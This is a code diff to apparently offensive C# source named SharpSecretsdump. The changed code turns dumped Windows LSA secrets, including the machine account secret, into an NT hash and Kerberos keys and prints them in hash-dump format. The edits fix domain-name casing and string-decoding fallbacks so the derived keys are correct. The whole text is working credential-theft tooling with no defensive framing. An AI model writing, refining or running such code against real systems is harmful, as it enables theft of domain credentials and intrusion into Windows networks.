@@ -222,7 +222,7 @@ namespace SharpSecretsdump
                                     if (secret.ToUpper().StartsWith("$MACHINE.ACC"))
                                     {
                                         string computerAcctHash = Hexlify(Crypto.Md4Hash2(secretBlob.secret));
-                                        string domainName = Encoding.ASCII.GetString(GetRegKeyValue("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", "Domain")).Trim('\0');
+                                        string domainName = Encoding.ASCII.GetString(GetRegKeyValue("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", "Domain")).Trim('\0').ToUpper();
                                         string computerName = Encoding.ASCII.GetString(GetRegKeyValue("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", "Hostname")).Trim('\0');
 
                                         PrintMachineKerberos(secretBlob.secret, domainName, computerName);
@@ -281,10 +281,10 @@ namespace SharpSecretsdump
         {
             byte[] salt = Encoding.UTF8.GetBytes($"{domainName.ToUpper()}host{computerName.ToLower()}.{domainName.ToLower()}");
 
-            Encoding UTF16decoder = Encoding.GetEncoding(System.Text.UnicodeEncoding.Unicode.CodePage, new EncoderReplacementFallback(), new DecoderReplacementFallback());
-            Encoding UTF8encoder = Encoding.GetEncoding(System.Text.UnicodeEncoding.UTF8.CodePage, new EncoderReplacementFallback(), new DecoderReplacementFallback());
+            Encoding UTF16 = Encoding.GetEncoding(System.Text.UnicodeEncoding.Unicode.CodePage, new EncoderReplacementFallback(), new DecoderReplacementFallback("�"));
+            Encoding UTF8 = Encoding.GetEncoding(System.Text.UnicodeEncoding.UTF8.CodePage, new EncoderReplacementFallback("?"), new DecoderReplacementFallback());
 
-            byte[] rawSecret = UTF8encoder.GetBytes(UTF16decoder.GetString(secret));
+            byte[] rawSecret = UTF8.GetBytes(UTF16.GetString(secret));
 
             var kerberosEncryptions = new EncryptionType[]
             {
@@ -295,7 +295,7 @@ namespace SharpSecretsdump
 
             foreach(EncryptionType type in kerberosEncryptions)
             {
-                byte[] key = KeyGenerator.MakeKey(type, UTF8encoder.GetString(rawSecret), UTF8encoder.GetString(salt));
+                byte[] key = KeyGenerator.MakeKey(type, UTF8.GetString(rawSecret), UTF8.GetString(salt));
                 Console.WriteLine($"{domainName}\\{computerName}$:{type.ToString().ToLower().Replace("_", "-")}:{Hexlify(key)}");
             }
         }
